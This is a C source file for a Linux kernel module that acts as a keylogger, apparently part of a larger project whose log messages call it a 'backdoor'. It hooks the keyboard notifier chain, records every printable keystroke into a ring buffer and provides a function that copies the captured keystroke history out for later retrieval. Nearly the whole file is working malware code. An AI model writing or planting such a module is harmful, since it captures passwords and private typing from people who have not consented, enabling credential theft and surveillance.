#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/slab.h>

#include "keylogger.h"

char buffer[BUFFER_SIZE] = { '\0' };
int fill = 0;

void save_key(char key)
{
	buffer[fill] = key;
	fill = (fill + 1) % BUFFER_SIZE;
}

/**
* This needs to be freed after using
* This needs to be checked for failing to allocate memory
*/
char *read_key_history(void)
{
	int num_items_to_consume = BUFFER_SIZE;
	int consumed_count = 0;
	char *consumed_items = (char *)kmalloc(
		num_items_to_consume * sizeof(char), GFP_KERNEL);

	if (!consumed_items) {
		printk(KERN_ERR
		       "Failed to allocate memory for consumed items\n");
		return NULL;
	}

	while (consumed_count < num_items_to_consume) {
		char item = buffer[(fill - consumed_count - 1 + BUFFER_SIZE) %
				   BUFFER_SIZE];

		consumed_items[consumed_count] = item;
		consumed_count++;
	}

	return consumed_items;
}

int keyboard_notifier_callback(struct notifier_block *nblock,
			       unsigned long code, void *_param)
{
	struct keyboard_notifier_param *param = _param;

	if (code == KBD_KEYSYM && param->down) {
		char key = param->value;

		if (key == 0x01) {
			save_key(0x0a);
		} else if (key >= 0x20 && key < 0x7f) {
			save_key(key);
		}
	}

	return NOTIFY_OK;
}

struct notifier_block keyboard_notifier_block = {
	.notifier_call = keyboard_notifier_callback,
};

int __init keylogger_module_init(void)
{
	int result = register_keyboard_notifier(&keyboard_notifier_block);

	if (result != 0) {
		printk(KERN_ERR
		       "backdoor: failed to register keyboard notifier\n");
		return result;
	}

	printk(KERN_INFO "backdoor: keylogger module initialized\n");
	return 0;
}

void keylogger_module_exit(void)
{
	int result = unregister_keyboard_notifier(&keyboard_notifier_block);

	if (result != 0) {
		printk(KERN_ERR
		       "backdoor: failed to unregister keyboard notifier: %d\n",
		       result);
	}

	printk(KERN_INFO "backdoor: keylogger module exited\n");
}
